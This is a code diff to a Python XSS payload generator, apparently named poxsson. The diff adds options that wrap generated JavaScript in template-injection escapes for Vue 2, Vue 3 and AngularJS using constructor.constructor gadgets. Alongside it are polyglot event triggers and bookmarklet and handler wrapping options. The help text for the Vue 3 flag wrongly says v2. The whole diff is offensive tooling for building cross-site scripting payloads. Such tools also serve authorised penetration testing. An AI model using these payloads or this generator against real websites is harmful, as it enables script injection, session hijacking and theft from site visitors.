@@ -13,7 +13,6 @@ import socket
 #import atexit
 POXSSON_PATH = os.path.realpath(__file__).replace("poxsson.py", "") #Absolute path of the project directory
 
-
 polyglot_triggers = [
 ["onload","common tags", "0-click"],
 ["onpageshow","body","Works only without DOM dependency"],
@@ -211,8 +210,11 @@ def arguments():
     wrapping.add_argument('--oneliner', action='store_true', dest='ONELINER', help="Convert generated payload to one-liner")
     wrapping.add_argument('--bookmarklet', action='store_true', dest='BOOKMARKLET', help="Convert generated payload to a bookmarklet")
     wrapping.add_argument('--handler', action='store_true', dest='HANDLER', help="Start handler after payload generation")
-    wrapping.add_argument('--jquery', action='store_true', dest='JQUERY', help="Load JQuery before running the payload")
     wrapping.add_argument('--replace-http', action='store_true', dest='REPLACE_HTTP', help="Replace 'http[s]://' with a random substitute")
+    wrapping.add_argument('--jquery', action='store_true', dest='JQUERY', help="Load JQuery before running the payload")
+    wrapping.add_argument('--v2', action='store_true', dest='VUE_2', help="Embedd payload inside VueJS v2 template source")
+    wrapping.add_argument('--v3', action='store_true', dest='VUE_3', help="Embedd payload inside VueJS v2 template source")
+    wrapping.add_argument('--angular', action='store_true', dest='ANGULAR', help="Embedd payload inside AngularJS template source")
     #parser.add_argument('--replacei-chars', action='store', choices=['html', 'octal', 'url', 'iso', 'hex', 'numeric'], dest='REPLACE', 
     #                    help="Replace all special characters with their equivalents of selected type")
     return parser.parse_args()
@@ -330,6 +332,15 @@ def main():
 
     if res.CONFIRM:
         js_code = js_code.replace("alert", "confirm")
+
+    if res.VUE_2:
+        js_code = f"{{constructor.constructor('{js_code}')()}}"
+
+    if res.VUE_3:
+        js_code = f"{{_openBlock.constructor('{js_code}')()}}"
+
+    if res.ANGULAR:
+        js_code = f"{{constructor.constructor('{js_code}')()}}"
 
     if res.CLIP: #Copies payload to system clipboard (can be pasted with Ctrl-V)
         pyperclip.copy(js_code)
